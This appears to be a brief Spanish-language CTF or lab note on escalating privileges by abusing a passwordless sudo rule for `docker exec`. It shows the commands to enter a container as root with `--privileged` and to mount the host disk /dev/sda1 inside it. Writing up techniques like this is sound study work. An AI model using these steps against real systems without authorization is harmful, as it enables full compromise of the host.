#abusobinariodocker #docker

---
# Enumeracion


```shell
sudo -l
```


![[Data27.png]]
Nos indica que podemos ejecutar como root sin proporcionar contraseña el binario `/snap/bin/docker exec *`

---
# Explotacion


Si uso  [[ps faux y ps -eo]] con el comando `ps -faux | grep docker` vemos que esta corriendo el docker e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81

![[Data28.png]]

Asi que nos vamos a meter al contenedor como si fueramos el usuario root con `sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash`


![[Data29.png]]
Si usamos [[mount]] vemos que la primera partición del disco /dev/sda1 esta sirviendo como sistema de archivos real para ficheros dentro del contenedor
![[Data35.png]]

Asi que vamos a usar el comando ``mount /dev/sda1 /mnt/`` para montar todos los archivos de la maquina host del directorio /dev/sda1 a la carpeta /mnt del contenedor